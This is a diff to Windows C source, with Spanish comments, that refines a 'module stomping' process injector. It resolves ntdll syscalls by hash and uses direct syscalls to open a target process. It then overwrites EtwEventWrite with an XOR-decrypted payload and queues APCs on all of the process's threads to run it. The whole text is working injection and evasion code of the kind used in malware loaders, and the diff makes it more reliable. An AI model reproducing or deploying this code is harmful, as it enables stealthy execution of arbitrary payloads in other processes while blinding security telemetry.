@@ -448,101 +448,175 @@ PVOID GetRemoteModuleBase(DWORD dwPid, const wchar_t* szModuleName) {
 BOOL ModuleStompingInject(DWORD dwPid, PBYTE pPayload, SIZE_T sPayload) {
     VX_TABLE table = { 0 };
     HMODULE hNtdllLocal = GetModuleHandleA("ntdll.dll");
+    
+    // Hashes verificados para ntdll
+    table.NtOpenProcess.dwHash = 0xD78326E2;        // "NtOpenProcess"
+    table.NtWriteVirtualMemory.dwHash = 0x3D601EFC; // "NtWriteVirtualMemory"
+    table.NtProtectVirtualMemory.dwHash = 0x81EF4CB2; // "NtProtectVirtualMemory"
+    table.NtOpenThread.dwHash = 0xB211EF1B;         // "NtOpenThread"
+    table.NtQueueApcThread.dwHash = 0x309B84A2;     // "NtQueueApcThread"
+    table.NtClose.dwHash = 0xD8CDDA27;              // "NtClose"
 
-    table.NtOpenProcess.dwHash = 0xD78326E2;
-    table.NtWriteVirtualMemory.dwHash = 0x3D601EFC;
-    table.NtProtectVirtualMemory.dwHash = 0x81EF4CB2;
-    table.NtOpenThread.dwHash = 0xB211EF1B;
-    table.NtQueueApcThread.dwHash = 0x309B84A2;
-    table.NtClose.dwHash = 0xD8CDDA27;
+    table.NtOpenProcess.wID = GetSyscallNumber(hNtdllLocal, table.NtOpenProcess.dwHash);
+    table.NtWriteVirtualMemory.wID = GetSyscallNumber(hNtdllLocal, table.NtWriteVirtualMemory.dwHash);
+    table.NtProtectVirtualMemory.wID = GetSyscallNumber(hNtdllLocal, table.NtProtectVirtualMemory.dwHash);
+    table.NtOpenThread.wID = GetSyscallNumber(hNtdllLocal, table.NtOpenThread.dwHash);
+    table.NtQueueApcThread.wID = GetSyscallNumber(hNtdllLocal, table.NtQueueApcThread.dwHash);
+    table.NtClose.wID = GetSyscallNumber(hNtdllLocal, table.NtClose.dwHash);
 
-    table.NtOpenProcess.wID = GetSyscallNumber(hNtdllLocal, (DWORD)table.NtOpenProcess.dwHash);
-    table.NtWriteVirtualMemory.wID = GetSyscallNumber(hNtdllLocal, (DWORD)table.NtWriteVirtualMemory.dwHash);
-    table.NtProtectVirtualMemory.wID = GetSyscallNumber(hNtdllLocal, (DWORD)table.NtProtectVirtualMemory.dwHash);
-    table.NtOpenThread.wID = GetSyscallNumber(hNtdllLocal, (DWORD)table.NtOpenThread.dwHash);
-    table.NtQueueApcThread.wID = GetSyscallNumber(hNtdllLocal, (DWORD)table.NtQueueApcThread.dwHash);
-    table.NtClose.wID = GetSyscallNumber(hNtdllLocal, (DWORD)table.NtClose.dwHash);
-
-    printf("[+] Resolviendo Direcciones Remotas (Bypass ASLR)...\n");
-
-    // 1. Obtener dirección local de la función objetivo
-    PVOID pFuncLocal = GetFunctionAddress(hNtdllLocal, 0xE4DF2AAC); // EtwEventWrite
-    if (!pFuncLocal) return FALSE;
-
-    // 2. Calcular RVA (Relative Virtual Address)
-    DWORD64 dwRva = (DWORD64)pFuncLocal - (DWORD64)hNtdllLocal;
-
-    // 3. Obtener base remota de ntdll.dll
-    PVOID pNtdllRemoteBase = GetRemoteModuleBase(dwPid, L"ntdll.dll");
-    if (!pNtdllRemoteBase) {
-        printf("[-] No se pudo encontrar ntdll.dll en el proceso remoto.\n");
+    // Verificar que todos los SSN se resolvieron
+    if (!table.NtOpenProcess.wID || !table.NtWriteVirtualMemory.wID || 
+        !table.NtProtectVirtualMemory.wID || !table.NtOpenThread.wID ||
+        !table.NtQueueApcThread.wID) {
+        printf("[-] Error: No se pudieron resolver todos los syscalls\n");
         return FALSE;
     }
 
-    // 4. Calcular dirección absoluta remota
+    printf("[+] Syscalls resueltos: Open=%d Write=%d Protect=%d\n",
+        table.NtOpenProcess.wID, table.NtWriteVirtualMemory.wID, 
+        table.NtProtectVirtualMemory.wID);
+
+    // 1. Obtener dirección local de EtwEventWrite (función objetivo para stomping)
+    PVOID pFuncLocal = GetFunctionAddress(hNtdllLocal, 0xE4DF2AAC); // EtwEventWrite hash
+    if (!pFuncLocal) {
+        printf("[-] No se pudo resolver EtwEventWrite\n");
+        return FALSE;
+    }
+
+    // 2. Calcular RVA
+    DWORD64 dwRva = (DWORD64)pFuncLocal - (DWORD64)hNtdllLocal;
+    printf("[+] RVA de EtwEventWrite: 0x%llX\n", dwRva);
+
+    // 3. Obtener base remota de ntdll
+    PVOID pNtdllRemoteBase = GetRemoteModuleBase(dwPid, L"ntdll.dll");
+    if (!pNtdllRemoteBase) {
+        printf("[-] No se pudo encontrar ntdll.dll remoto\n");
+        return FALSE;
+    }
+
+    // 4. Calcular dirección remota exacta
     PVOID pRemoteAddress = (PVOID)((DWORD64)pNtdllRemoteBase + dwRva);
-    printf("[*] Target Remoto: 0x%p (Base: 0x%p + RVA: 0x%llX)\n", pRemoteAddress, pNtdllRemoteBase, dwRva);
+    
+    // Alinear a página para operaciones de protección
+    SYSTEM_INFO si;
+    GetSystemInfo(&si);
+    DWORD dwPageSize = si.dwPageSize;
+    
+    PVOID pAlignedAddress = (PVOID)(((DWORD64)pRemoteAddress + dwPageSize - 1) & ~(dwPageSize - 1));
+    SIZE_T sAlignedSize = ((sPayload + dwPageSize - 1) & ~(dwPageSize - 1));
+    
+    // Si el payload cruza límites de página, ajustar
+    if ((DWORD64)pRemoteAddress % dwPageSize != 0) {
+        pAlignedAddress = (PVOID)((DWORD64)pRemoteAddress & ~(dwPageSize - 1));
+        SIZE_T sOffset = (DWORD64)pRemoteAddress - (DWORD64)pAlignedAddress;
+        sAlignedSize = ((sOffset + sPayload + dwPageSize - 1) & ~(dwPageSize - 1));
+    }
+
+    printf("[*] Dirección objetivo: 0x%p (Alineada: 0x%p, Tamaño: %zu)\n", 
+        pRemoteAddress, pAlignedAddress, sAlignedSize);
+
+    // Verificar tamaño del payload vs espacio disponible (estimado)
+    if (sPayload > 4096) { // EtwEventWrite típicamente tiene espacio suficiente
+        printf("[-] Payload demasiado grande (>4KB)\n");
+        return FALSE;
+    }
 
     HANDLE hProcess = NULL;
     OBJECT_ATTRIBUTES oa = { sizeof(oa) };
     CLIENT_ID cid = { (HANDLE)(ULONG_PTR)dwPid, 0 };
 
-    // 1. Abrir proceso remoto
-    NTSTATUS status = DirectSyscall(table.NtOpenProcess.wID, &hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
-    if (status != 0) return FALSE;
-
-    // 2. Verificar tamaño de la función vs payload
-    // EtwEventWrite suele tener más de 512 bytes, pero es mejor verificar.
-    if (sPayload > 1024) {
-        printf("[-] Payload demasiado grande para Module Stomping (Max: 1024 bytes).\n");
-        DirectSyscall(table.NtClose.wID, hProcess);
+    // Abrir proceso objetivo
+    NTSTATUS status = DirectSyscall(table.NtOpenProcess.wID, &hProcess, PROCESS_VM_OPERATION | 
+        PROCESS_VM_WRITE | PROCESS_VM_READ, &oa, &cid);
+    if (status != 0 || !hProcess) {
+        printf("[-] NtOpenProcess falló: 0x%X\n", status);
         return FALSE;
     }
+    printf("[+] Handle de proceso: 0x%p\n", hProcess);
 
-    // 3. Cambiar protección de la función objetivo a RW
-    SIZE_T sRegionSize = sPayload;
+    // Cambiar protección a RW - usar dirección alineada
+    PVOID pProtectAddr = pAlignedAddress;
+    SIZE_T sProtectSize = sAlignedSize;
     ULONG ulOldProtect = 0;
-    status = DirectSyscall(table.NtProtectVirtualMemory.wID, hProcess, &pRemoteAddress, &sRegionSize, PAGE_READWRITE, &ulOldProtect);
+    
+    status = DirectSyscall(table.NtProtectVirtualMemory.wID, hProcess, &pProtectAddr, 
+        &sProtectSize, PAGE_READWRITE, &ulOldProtect);
     if (status != 0) {
+        printf("[-] NtProtectVirtualMemory (RW) falló: 0x%X\n", status);
         DirectSyscall(table.NtClose.wID, hProcess);
         return FALSE;
     }
+    printf("[+] Protección cambiada a RW (anterior: 0x%X)\n", ulOldProtect);
 
-    // 3. Escribir payload (Module Stomping)
-    PBYTE pLocalPayload = (PBYTE)malloc(sPayload);
+    // Descifrar y escribir payload
+    PBYTE pLocalPayload = (PBYTE)VirtualAlloc(NULL, sPayload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!pLocalPayload) {
+        DirectSyscall(table.NtProtectVirtualMemory.wID, hProcess, &pAlignedAddress, 
+            &sAlignedSize, ulOldProtect, &ulOldProtect);
+        DirectSyscall(table.NtClose.wID, hProcess);
+        return FALSE;
+    }
+    
     memcpy(pLocalPayload, pPayload, sPayload);
     XorDecrypt(pLocalPayload, sPayload, PAYLOAD_KEY);
 
-    status = DirectSyscall(table.NtWriteVirtualMemory.wID, hProcess, pRemoteAddress, pLocalPayload, sPayload, NULL);
-    free(pLocalPayload);
+    // Escribir en la dirección exacta (no alineada)
+    status = DirectSyscall(table.NtWriteVirtualMemory.wID, hProcess, pRemoteAddress, 
+        pLocalPayload, sPayload, NULL);
+    
+    SecureZeroMemory(pLocalPayload, sPayload);
+    VirtualFree(pLocalPayload, 0, MEM_RELEASE);
 
-    // 4. Restaurar protección a RX
-    status = DirectSyscall(table.NtProtectVirtualMemory.wID, hProcess, &pRemoteAddress, &sRegionSize, PAGE_EXECUTE_READ, &ulOldProtect);
+    if (status != 0) {
+        printf("[-] NtWriteVirtualMemory falló: 0x%X\n", status);
+        // Restaurar protección original
+        DirectSyscall(table.NtProtectVirtualMemory.wID, hProcess, &pAlignedAddress, 
+            &sAlignedSize, ulOldProtect, &ulOldProtect);
+        DirectSyscall(table.NtClose.wID, hProcess);
+        return FALSE;
+    }
+    printf("[+] Payload escrito (%zu bytes)\n", sPayload);
 
-    // 5. Encolar APC pointing a la función legítima "pisoteada"
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-    THREADENTRY32 te = { sizeof(te) };
-
-    if (Thread32First(hSnapshot, &te)) {
-        do {
-            if (te.th32OwnerProcessID == dwPid) {
-                HANDLE hThread = NULL;
-                cid.UniqueProcess = (HANDLE)(ULONG_PTR)te.th32OwnerProcessID;
-                cid.UniqueThread = (HANDLE)(ULONG_PTR)te.th32ThreadID;
-
-                status = DirectSyscall(table.NtOpenThread.wID, &hThread, THREAD_ALL_ACCESS, &oa, &cid);
-                if (status == 0 && hThread) {
-                    DirectSyscall(table.NtQueueApcThread.wID, hThread, pRemoteAddress, NULL, NULL, NULL);
-                    DirectSyscall(table.NtClose.wID, hThread);
-                }
-            }
-        } while (Thread32Next(hSnapshot, &te));
+    // Restaurar protección a RX
+    pProtectAddr = pAlignedAddress;
+    sProtectSize = sAlignedSize;
+    ULONG ulNewProtect = 0;
+    status = DirectSyscall(table.NtProtectVirtualMemory.wID, hProcess, &pProtectAddr, 
+        &sProtectSize, PAGE_EXECUTE_READ, &ulNewProtect);
+    if (status != 0) {
+        printf("[-] NtProtectVirtualMemory (RX) falló: 0x%X\n", status);
+    } else {
+        printf("[+] Protección restaurada a RX\n");
     }
 
-    DirectSyscall(table.NtClose.wID, hSnapshot);
-    DirectSyscall(table.NtClose.wID, hProcess);
+    // Encolar APCs en hilos del proceso objetivo
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    if (hSnapshot != INVALID_HANDLE_VALUE) {
+        THREADENTRY32 te = { sizeof(te) };
+        DWORD dwApcQueued = 0;
+        
+        if (Thread32First(hSnapshot, &te)) {
+            do {
+                if (te.th32OwnerProcessID == dwPid) {
+                    HANDLE hThread = NULL;
+                    CLIENT_ID cidThread = { 0, (HANDLE)(ULONG_PTR)te.th32ThreadID };
+                    
+                    status = DirectSyscall(table.NtOpenThread.wID, &hThread, THREAD_SET_CONTEXT, &oa, &cidThread);
+                    if (status == 0 && hThread) {
+                        // Usar dirección remota del payload como rutina APC
+                        status = DirectSyscall(table.NtQueueApcThread.wID, hThread, pRemoteAddress, NULL, NULL, NULL);
+                        if (status == 0) dwApcQueued++;
+                        DirectSyscall(table.NtClose.wID, hThread);
+                    }
+                }
+            } while (Thread32Next(hSnapshot, &te));
+        }
+        CloseHandle(hSnapshot);
+        printf("[+] APCs encoladas en %d hilos\n", dwApcQueued);
+    }
 
-    printf("[+] Inyección por Module Stomping completada con éxito.\n");
+    DirectSyscall(table.NtClose.wID, hProcess);
+    printf("[+] Inyección completada\n");
     return TRUE;
 }
 
